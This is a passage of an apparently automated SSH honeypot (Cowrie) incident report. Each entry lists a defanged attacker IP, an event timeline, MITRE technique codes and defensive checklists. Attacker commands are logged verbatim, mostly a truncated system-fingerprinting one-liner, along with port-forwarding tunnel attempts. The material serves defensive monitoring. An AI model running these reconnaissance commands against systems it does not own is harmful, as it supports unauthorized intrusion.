- [ ] Submit `122.176.45[.]238` to AbuseIPDB if not already reported
- [ ] Block `122.176.45[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eb103fcef44

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:12 |
| **Last Seen** | 2026-07-21 05:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:12:47` | `cowrie.session.connect` |
| `2026-07-21 05:12:47` | `cowrie.client.version` |
| `2026-07-21 05:12:47` | `cowrie.client.kex` |
| `2026-07-21 05:12:49` | `cowrie.login.success` |
| `2026-07-21 05:12:51` | `cowrie.session.params` |
| `2026-07-21 05:12:51` | `cowrie.command.input` |
| `2026-07-21 05:12:51` | `cowrie.command.input` |
| `2026-07-21 05:12:51` | `cowrie.command.input` |
| `2026-07-21 05:12:51` | `cowrie.command.input` |
| `2026-07-21 05:12:51` | `cowrie.command.input` |
| `2026-07-21 05:12:51` | `cowrie.command.success` |
| `2026-07-21 05:12:51` | `cowrie.command.input` |
| `2026-07-21 05:12:51` | `cowrie.command.input` |
| `2026-07-21 05:12:51` | `cowrie.command.input` |
| `2026-07-21 05:12:51` | `cowrie.command.input` |
| `2026-07-21 05:12:52` | `cowrie.log.closed` |
| `2026-07-21 05:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61244049e009

| Field | Detail |
|---|---|
| **Source IP** | `65.20.163[.]103` |
| **First Seen** | 2026-07-21 05:13 |
| **Last Seen** | 2026-07-21 05:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:13:00` | `cowrie.session.connect` |
| `2026-07-21 05:13:00` | `cowrie.client.version` |
| `2026-07-21 05:13:00` | `cowrie.client.kex` |
| `2026-07-21 05:13:01` | `cowrie.login.success` |
| `2026-07-21 05:13:02` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.163[.]103` to AbuseIPDB if not already reported
- [ ] Block `65.20.163[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f94ae04451dc

| Field | Detail |
|---|---|
| **Source IP** | `213.130.207[.]177` |
| **First Seen** | 2026-07-21 05:13 |
| **Last Seen** | 2026-07-21 05:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:13:07` | `cowrie.session.connect` |
| `2026-07-21 05:13:07` | `cowrie.client.version` |
| `2026-07-21 05:13:07` | `cowrie.client.kex` |
| `2026-07-21 05:13:08` | `cowrie.login.success` |
| `2026-07-21 05:13:08` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.130.207[.]177` to AbuseIPDB if not already reported
- [ ] Block `213.130.207[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-659200579554

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 05:13 |
| **Last Seen** | 2026-07-21 05:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:13:12` | `cowrie.session.connect` |
| `2026-07-21 05:13:12` | `cowrie.client.version` |
| `2026-07-21 05:13:12` | `cowrie.client.kex` |
| `2026-07-21 05:13:12` | `cowrie.login.success` |
| `2026-07-21 05:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-775acbaea16d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 05:13 |
| **Last Seen** | 2026-07-21 05:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:13:12` | `cowrie.session.connect` |
| `2026-07-21 05:13:12` | `cowrie.client.version` |
| `2026-07-21 05:13:12` | `cowrie.client.kex` |
| `2026-07-21 05:13:12` | `cowrie.login.success` |
| `2026-07-21 05:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f869d59abd5a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 05:13 |
| **Last Seen** | 2026-07-21 05:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:13:20` | `cowrie.session.connect` |
| `2026-07-21 05:13:20` | `cowrie.client.version` |
| `2026-07-21 05:13:20` | `cowrie.client.kex` |
| `2026-07-21 05:13:20` | `cowrie.login.success` |
| `2026-07-21 05:13:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0120f471fa6e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 05:13 |
| **Last Seen** | 2026-07-21 05:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:13:20` | `cowrie.session.connect` |
| `2026-07-21 05:13:20` | `cowrie.client.version` |
| `2026-07-21 05:13:20` | `cowrie.client.kex` |
| `2026-07-21 05:13:20` | `cowrie.login.success` |
| `2026-07-21 05:13:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0068b351923

| Field | Detail |
|---|---|
| **Source IP** | `185.100.84[.]174` |
| **First Seen** | 2026-07-21 05:14 |
| **Last Seen** | 2026-07-21 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:14:01` | `cowrie.session.connect` |
| `2026-07-21 05:14:01` | `cowrie.client.version` |
| `2026-07-21 05:14:01` | `cowrie.client.kex` |
| `2026-07-21 05:14:01` | `cowrie.login.success` |
| `2026-07-21 05:14:02` | `cowrie.session.params` |
| `2026-07-21 05:14:02` | `cowrie.command.input` |
| `2026-07-21 05:14:02` | `cowrie.log.closed` |
| `2026-07-21 05:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.100.84[.]174` to AbuseIPDB if not already reported
- [ ] Block `185.100.84[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e46d0c5f65bc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:14 |
| **Last Seen** | 2026-07-21 05:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:14:44` | `cowrie.session.connect` |
| `2026-07-21 05:14:44` | `cowrie.client.version` |
| `2026-07-21 05:14:44` | `cowrie.client.kex` |
| `2026-07-21 05:14:46` | `cowrie.login.success` |
| `2026-07-21 05:14:48` | `cowrie.session.params` |
| `2026-07-21 05:14:48` | `cowrie.command.input` |
| `2026-07-21 05:14:48` | `cowrie.command.input` |
| `2026-07-21 05:14:48` | `cowrie.command.input` |
| `2026-07-21 05:14:48` | `cowrie.command.input` |
| `2026-07-21 05:14:48` | `cowrie.command.input` |
| `2026-07-21 05:14:48` | `cowrie.command.success` |
| `2026-07-21 05:14:48` | `cowrie.command.input` |
| `2026-07-21 05:14:48` | `cowrie.command.input` |
| `2026-07-21 05:14:48` | `cowrie.command.input` |
| `2026-07-21 05:14:48` | `cowrie.command.input` |
| `2026-07-21 05:14:49` | `cowrie.log.closed` |
| `2026-07-21 05:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53f4907862d1

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-07-21 05:14 |
| **Last Seen** | 2026-07-21 05:19 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:14:57` | `cowrie.session.connect` |
| `2026-07-21 05:14:57` | `cowrie.client.version` |
| `2026-07-21 05:14:57` | `cowrie.client.kex` |
| `2026-07-21 05:14:59` | `cowrie.login.success` |
| `2026-07-21 05:14:59` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc62386bb941

| Field | Detail |
|---|---|
| **Source IP** | `92.126.223[.]175` |
| **First Seen** | 2026-07-21 05:15 |
| **Last Seen** | 2026-07-21 05:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:15:09` | `cowrie.session.connect` |
| `2026-07-21 05:15:09` | `cowrie.client.version` |
| `2026-07-21 05:15:09` | `cowrie.client.kex` |
| `2026-07-21 05:15:11` | `cowrie.login.success` |
| `2026-07-21 05:15:11` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:15:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.126.223[.]175` to AbuseIPDB if not already reported
- [ ] Block `92.126.223[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37a1af352849

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:16 |
| **Last Seen** | 2026-07-21 05:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:16:40` | `cowrie.session.connect` |
| `2026-07-21 05:16:41` | `cowrie.client.version` |
| `2026-07-21 05:16:41` | `cowrie.client.kex` |
| `2026-07-21 05:16:43` | `cowrie.login.success` |
| `2026-07-21 05:16:45` | `cowrie.session.params` |
| `2026-07-21 05:16:45` | `cowrie.command.input` |
| `2026-07-21 05:16:45` | `cowrie.command.input` |
| `2026-07-21 05:16:45` | `cowrie.command.input` |
| `2026-07-21 05:16:45` | `cowrie.command.input` |
| `2026-07-21 05:16:45` | `cowrie.command.input` |
| `2026-07-21 05:16:45` | `cowrie.command.success` |
| `2026-07-21 05:16:45` | `cowrie.command.input` |
| `2026-07-21 05:16:45` | `cowrie.command.input` |
| `2026-07-21 05:16:45` | `cowrie.command.input` |
| `2026-07-21 05:16:45` | `cowrie.command.input` |
| `2026-07-21 05:16:45` | `cowrie.log.closed` |
| `2026-07-21 05:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57adfa6ab4c6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:18 |
| **Last Seen** | 2026-07-21 05:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:18:34` | `cowrie.session.connect` |
| `2026-07-21 05:18:35` | `cowrie.client.version` |
| `2026-07-21 05:18:35` | `cowrie.client.kex` |
| `2026-07-21 05:18:37` | `cowrie.login.success` |
| `2026-07-21 05:18:38` | `cowrie.session.params` |
| `2026-07-21 05:18:38` | `cowrie.command.input` |
| `2026-07-21 05:18:38` | `cowrie.command.input` |
| `2026-07-21 05:18:38` | `cowrie.command.input` |
| `2026-07-21 05:18:38` | `cowrie.command.input` |
| `2026-07-21 05:18:38` | `cowrie.command.input` |
| `2026-07-21 05:18:38` | `cowrie.command.success` |
| `2026-07-21 05:18:38` | `cowrie.command.input` |
| `2026-07-21 05:18:39` | `cowrie.command.input` |
| `2026-07-21 05:18:39` | `cowrie.command.input` |
| `2026-07-21 05:18:39` | `cowrie.command.input` |
| `2026-07-21 05:18:39` | `cowrie.log.closed` |
| `2026-07-21 05:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83d53993dd30

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 05:18 |
| **Last Seen** | 2026-07-21 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:18:40` | `cowrie.session.connect` |
| `2026-07-21 05:18:40` | `cowrie.client.version` |
| `2026-07-21 05:18:40` | `cowrie.client.kex` |
| `2026-07-21 05:18:40` | `cowrie.login.success` |
| `2026-07-21 05:18:41` | `cowrie.session.params` |
| `2026-07-21 05:18:41` | `cowrie.command.input` |
| `2026-07-21 05:18:41` | `cowrie.log.closed` |
| `2026-07-21 05:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15d918e18145

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:20 |
| **Last Seen** | 2026-07-21 05:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:20:28` | `cowrie.session.connect` |
| `2026-07-21 05:20:29` | `cowrie.client.version` |
| `2026-07-21 05:20:29` | `cowrie.client.kex` |
| `2026-07-21 05:20:31` | `cowrie.login.success` |
| `2026-07-21 05:20:32` | `cowrie.session.params` |
| `2026-07-21 05:20:32` | `cowrie.command.input` |
| `2026-07-21 05:20:32` | `cowrie.command.input` |
| `2026-07-21 05:20:32` | `cowrie.command.input` |
| `2026-07-21 05:20:32` | `cowrie.command.input` |
| `2026-07-21 05:20:32` | `cowrie.command.input` |
| `2026-07-21 05:20:32` | `cowrie.command.success` |
| `2026-07-21 05:20:32` | `cowrie.command.input` |
| `2026-07-21 05:20:32` | `cowrie.command.input` |
| `2026-07-21 05:20:32` | `cowrie.command.input` |
| `2026-07-21 05:20:32` | `cowrie.command.input` |
| `2026-07-21 05:20:33` | `cowrie.log.closed` |
| `2026-07-21 05:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67efdce2a71c

| Field | Detail |
|---|---|
| **Source IP** | `77.83.39[.]213` |
| **First Seen** | 2026-07-21 05:21 |
| **Last Seen** | 2026-07-21 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:21:58` | `cowrie.session.connect` |
| `2026-07-21 05:21:58` | `cowrie.client.version` |
| `2026-07-21 05:21:58` | `cowrie.client.kex` |
| `2026-07-21 05:21:59` | `cowrie.login.success` |
| `2026-07-21 05:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.83.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `77.83.39[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ef5f1c8155c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:22 |
| **Last Seen** | 2026-07-21 05:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:22:22` | `cowrie.session.connect` |
| `2026-07-21 05:22:22` | `cowrie.client.version` |
| `2026-07-21 05:22:22` | `cowrie.client.kex` |
| `2026-07-21 05:22:25` | `cowrie.login.success` |
| `2026-07-21 05:22:26` | `cowrie.session.params` |
| `2026-07-21 05:22:26` | `cowrie.command.input` |
| `2026-07-21 05:22:26` | `cowrie.command.input` |
| `2026-07-21 05:22:26` | `cowrie.command.input` |
| `2026-07-21 05:22:26` | `cowrie.command.input` |
| `2026-07-21 05:22:26` | `cowrie.command.input` |
| `2026-07-21 05:22:26` | `cowrie.command.success` |
| `2026-07-21 05:22:26` | `cowrie.command.input` |
| `2026-07-21 05:22:26` | `cowrie.command.input` |
| `2026-07-21 05:22:26` | `cowrie.command.input` |
| `2026-07-21 05:22:26` | `cowrie.command.input` |
| `2026-07-21 05:22:27` | `cowrie.log.closed` |
| `2026-07-21 05:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-619742811204

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:24 |
| **Last Seen** | 2026-07-21 05:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:24:19` | `cowrie.session.connect` |
| `2026-07-21 05:24:19` | `cowrie.client.version` |
| `2026-07-21 05:24:19` | `cowrie.client.kex` |
| `2026-07-21 05:24:21` | `cowrie.login.success` |
| `2026-07-21 05:24:23` | `cowrie.session.params` |
| `2026-07-21 05:24:23` | `cowrie.command.input` |
| `2026-07-21 05:24:23` | `cowrie.command.input` |
| `2026-07-21 05:24:23` | `cowrie.command.input` |
| `2026-07-21 05:24:23` | `cowrie.command.input` |
| `2026-07-21 05:24:23` | `cowrie.command.input` |
| `2026-07-21 05:24:23` | `cowrie.command.success` |
| `2026-07-21 05:24:23` | `cowrie.command.input` |
| `2026-07-21 05:24:23` | `cowrie.command.input` |
| `2026-07-21 05:24:23` | `cowrie.command.input` |
| `2026-07-21 05:24:23` | `cowrie.command.input` |
| `2026-07-21 05:24:23` | `cowrie.log.closed` |
| `2026-07-21 05:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20a61b5427fe

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 05:26 |
| **Last Seen** | 2026-07-21 05:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:26:01` | `cowrie.session.connect` |
| `2026-07-21 05:26:01` | `cowrie.client.version` |
| `2026-07-21 05:26:01` | `cowrie.client.kex` |
| `2026-07-21 05:26:01` | `cowrie.login.success` |
| `2026-07-21 05:26:02` | `cowrie.session.params` |
| `2026-07-21 05:26:02` | `cowrie.command.input` |
